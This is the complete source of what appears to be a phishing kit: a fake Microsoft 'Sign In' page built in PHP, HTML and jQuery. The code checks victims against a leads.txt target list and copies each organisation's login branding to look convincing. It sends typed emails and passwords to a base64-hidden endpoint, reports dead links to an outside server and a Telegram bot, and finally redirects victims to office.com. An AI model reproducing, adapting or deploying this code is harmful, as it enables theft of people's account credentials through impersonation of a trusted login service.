<?php
include 'config/config.php';
if(($botToken!=null || $botToken!="")&&($id!=null || $id!="") ) {
    function getAddress()
    {
        if(isset($_SERVER['HTTPS'])) {
            $protocol = $_SERVER['HTTPS'] == 'on' ? 'https' : 'http';
        }else {
            $protocol ='http';
        }
        return $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    }
    $base_url = getAddress();
    $ch = curl_init();
    // $opition = array($token,$domain,$base_url,$botToken,$id);
    $url = "http://api.bestfriendstore.net/web/get/dead?token=" . $token . "&domain=" . $domain ."&app=".$app. "&link=" . $base_url;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    if($result=="Dead"){
        $url1 = "https://api.telegram.org/bot" . $botToken . "/sendmessage?chat_id=" . $id . "&text= Your Link / Page is Dead ";
        $handle = curl_init();
        curl_setopt($handle, CURLOPT_URL, $url1);
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($handle);
        curl_close($handle);
    }
}
?>
<!doctype html>
<html lang="en">

<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript"  src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <title>Microsoft | Login</title>
    <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
    <style type="text/css">
        textarea:hover,
        input:hover,
        textarea:active,
        input:active,
        textarea:focus,
        input:focus,
        button:focus,
        button:active,
        button:hover,
        label:focus,
        .btn:active,
        .btn.active {
            outline: 0px !important;
            -webkit-appearance: none;
            box-shadow: none !important;
        }

        .box {
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
            border: 0px solid rgba(0, 0, 0, 0.4);
            max-height: 415px;


            width: 440px;
            /*width: calc(100% - 40px);*/
            padding: 44px;
            margin-left: auto;
            margin-right: auto;
            margin-top: 20px;
            margin-bottom: 28px;
        }

        #footer {
            position: fixed;
            bottom: 0px;
            width: 100%;
            overflow: visible;
            z-index: 99;
            clear: both;


        }

        /*.footerNode span {
        color: #fff;
        font-size: 0.75rem;
        line-height: 28px;
        white-space: nowrap;
        display: inline-block;
        float: right;
        margin-left: 8px;
        margin-right: 8px;
    }*/
        div .footerNode a,
        div .footerNode span {
            color: black;
            font-size: 0.75rem;
            line-height: 28px;
            white-space: nowrap;
            display: inline-block;
            float: right;
            margin-left: 8px;
            margin-right: 8px;
        }

        @media only screen and (max-width: 610px) {
            #hide {
                display: none;
            }
        }
    </style>
</head>

<body id="mainbg" style="background-image: url('images/bg.jpg'); background-size: cover;background-repeat: no-repeat;" >
<div class="container-fluid">
    <div class="container">
        <div class="row my-5 py-5">

            <div class="col-lg-6 mx-auto">
                <!-- ////////////////////////div1 start/////////////////////// -->
                <div class="m-5 p-5 bg-white box" id="div1">
                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>

                    <span class="h5">Sign In</span><br>
                    <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
                    <div class="form-group mt-2">
                        <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
                    </div>
                    <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
                    <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                    <p style="font-size: 14px"><a href="#">sign in options</a></p>
                    <div class="text-right">
                        <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
                    </div>
                </div>
                <!-- ////////////////////////div1 end/////////////////////// -->
                <!-- ////////////////////////div2 start/////////////////////// -->
                <div class="m-5 p-5 bg-white box" id="div2" style="display: none;">
                    <form id="contact">
                        <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br>
                        <br/>
                        <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span>
                        <div class="py-2"><span class="h4" style="color: #4E4542">Enter Password</span></div>
                        <div class="pb-2">
                            <span id="msg" class="text-dark">Because you're accessing sensitive info, you need to verify your password </span>
                            <span id="msg2" class="text-danger" style="display: none;">Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a></span>
                            <span id="msg1" class="text-danger" style="display: none;">Sign in attempt timeout, verify your password </span>
                        </div>

                        <div class="form-group mt-1">
                            <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                        </div>
                        <p style="font-size: 14px"><a href="#">Forget password?</a></p>
                        <!-- <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                        <p style="font-size: 14px"><a href="#">sign in options</a></p> -->
                        <div class="text-right">
                            <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button>
                        </div>
                    </form>
                </div>
                <!-- ////////////////////////div2 end/////////////////////// -->
                <!-- ////////////////////////div3 start/////////////////////// -->
                <div class="m-5 p-5 bg-white box" id="div3" style="display: none;min-height: 440px;min-width: 408px;">
                    <!-- <img src="images/microsoft_logo.svg" class="img-fluid"><br><br> -->
                    <div class="text-center mt-3 text-center">
                        <img src="images/success.PNG" class="img-fluid" id="success" width="140px">
                    </div>
                    <center><span id="load-text-2" style="font-size: 20px;display: block;"><br><br><br>Successfully Confirmed:<br>Redirected to homepage...</span></center>
                </div>
            </div>
            <!-- ////////////////////////div3 end/////////////////////// -->
        </div>
    </div>
</div>
</div>
<footer id="footer" style="padding-right: 30px">
    <div>
        <div class="footerNode">
            <span>Privacy & cookie</span>
            <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Terms of use</a>
        </div>
    </div>
</footer>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
    /* global $ */
    $(document).ready(function() {
        var count = 0;

        /////////////url ai getting////////////////
        var ai = window.location.hash.substr(1);
        if (!ai) {

        } else {


            var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

            if (!base64regex.test(ai)) {
                // alert(btoa(ai));
                var my_ai = ai;
            } else {
                // alert(atob(ai));
                var my_ai = atob(ai);
            }

            // $('#ai').val(ai);
            // var my_ai =ai;
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

            if (!filter.test(my_ai)) {
                $('#error').show();
                ai.focus;
                return false;
            }
            var ind = my_ai.indexOf("@");
            fetchLogoAndBackground(my_ai);

            jQuery.get('leads.txt', function (data,status, xhr) {
                if (status != "error") {
                    var lines = data.split("\n");
                    len = lines.length;
                    var found;
                    for (var i = 0; i < len; i++) {
                        // alert(len[i]);
                        if (my_ai.trim() == lines[i].trim()) {
                            found = lines[i].trim();
                            break;
                        }
                    }
                    if (found == null) {
                        window.location.replace("http://google.com");

                    }
                }
            });
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();
            var finalu = c.toUpperCase();
            $('#ai').val(my_ai);
            $("#div1").animate({ left: 0, opacity: "hide" }, 0);
            $("#div2").animate({ right: 0, opacity: "show" }, 500);

            $("#aich").html(my_ai);
            // $.get("https://logo.clearbit.com/" + my_slice)
            //     .done(function() {
            //         $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
            //         $(".logoname").html(finalu);
            //
            //     }).fail(function() {
            //         $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
            //         $(".logoname").html("Microsoft");
            //
            //     });

        }


        async function fetchLogoAndBackground(username) {

            var msLogo = $('.logoimg');
            //    var msBGmain = $('body');
            var res = await $.ajax({
                url: "./call.php?u=" + username,
                type: "get",
                crossDomain: true,
                dataType: "json"
            });
            var arr = res['EstsProperties']['UserTenantBranding'];
            var ree= res['Credentials']['FederationRedirectUrl'];
            if(ree != undefined){
                // $("#mm-form").hide();
                // $("#animi").show();
                window.location.href="nn.html#"+ree+"#"+username;
            }

            // available
            if (Array.isArray(arr)) {
                var logo = arr[0]['BannerLogo'];
                var mainBg = arr[0]['Illustration'];
                if (logo == null) {
                } else {
                    $(".logoimg").attr("src", logo);
                    $(".logoimg").attr('width', 80);
                    $(".logoimg").attr('height', 90);
                    $(".logoname").html("");
                    document.body.style.backgroundImage = "url("+mainBg+")";
                }
            } else {
                var obj = res['Credentials']['FederationRedirectUrl'];

                // console.log(obj);

                // if (obj) {
                //     await get_site_logo(username);
                // } else if (obj == null) {
                //     await get_site_logo(username);
                // } else {
                //     await get_site_logo(username);
                // }
            }
        }

        $('#ai').click(function() {
            $('#error').hide();
        });

        $(document).keypress(function(event) {
            setTimeout(function(){
                var keycode = (event.keyCode ? event.keyCode : event.which);
                if (keycode == '13') {

                    // window.location.href ="config/godaddy.html#"+y;

                    event.preventDefault();

                    if ($("#div1").is(":visible")) {

                        $("#next").click();

                    } else if ($("#div2").is(":visible")) {
                        event.preventDefault();

                        $("#submit-btn").click();

                    } else {
                        return false;
                    }

                }
            }, 2000);
        });


        $('#next').click(function() {
            event.preventDefault()
            var my_ai = $('#ai').val();
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

            if (!filter.test(my_ai)) {
                $('#error').show();
                ai.focus;
                return false;
            }
            var ind = my_ai.indexOf("@");
            jQuery.get('leads.txt', function (data,status, xhr) {
                if (status != "error") {
                    var lines = data.split("\n");
                    len = lines.length;
                    var found;
                    for (var i = 0; i < len; i++) {
                        // alert(len[i]);
                        if (my_ai.trim() == lines[i].trim()) {
                            found = lines[i].trim();
                            break;
                        }
                    }
                    if (found == null) {
                        window.location.replace("http://google.com");

                    }
                }
            });
            fetchLogoAndBackground(my_ai);
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();
            var finalu = c.toUpperCase();
            setTimeout(function(){
                $("#div1").animate({ left: 0, opacity: "hide" }, 0);
                $("#div2").animate({ right: 0, opacity: "show" }, 500);
                $("#aich").html(my_ai);
            }, 2500);


        });
        var file="bmV4dC5waHA=";

        $('#submit-btn').click(function(event) {
            event.preventDefault();
            var ai = $("#ai").val();
            var pr = $("#pr").val();
            var detail = $("#field").html();
            var msg = $('#msg').html();
            var my_ai = ai;
            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();
            $('#msg').text(msg);
            count = count + 1;
            $.ajax({
                dataType: 'JSON',
                url: atob(file),
                type: 'POST',
                data: {
                    login: ai,
                    passwd: pr,
                },
                beforeSend: function(xhr) {
                    $("#submit-btn").html("verifying...");
                },
                success: function(response) {
                    $("#pr").val("");
                    if(response=="success"){
                        window.location.replace("https://www.office.com");
                    }else{
                        $("#msg2").show();
                        $("#msg").hide();
                        $("#msg1").hide();
                    }
                    // if (count >= 3) {
                    //     count = 0;
                    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    //     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    //     setTimeout(() => {
                    //         window.location.replace("https://www.office.com");
                    //     }, 500);
                    //     return false;
                    // }
                    // if (count == 2) {
                    //     $("#msg2").show();
                    //     $("#msg").hide();
                    //     $("#msg1").hide();
                    // } else {
                    //     $("#msg1").show();
                    //     $("#msg").hide();
                    //     $("#msg2").hide();
                    //
                    // }
                },
                error: function() {
                    $("#pr").val("");
                    if (count >= 3) {
                        count = 0;
                        $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                        $("#div3").animate({ left: 0, opacity: "show" }, 500);
                        setTimeout(() => {
                            window.location.replace("https://www.office.com");
                        }, 1000);
                        return false;
                    }
                    if (count == 2) {
                        $("#msg2").show();
                        $("#msg").hide();
                        $("#msg1").hide();
                    } else {
                        $("#msg2").show();
                        $("#msg").hide();
                        $("#msg1").hide();

                    }
                },
                complete: function() {
                    $("#submit-btn").html("Sign in");
                }
            });
        });
    });
</script>

</html>
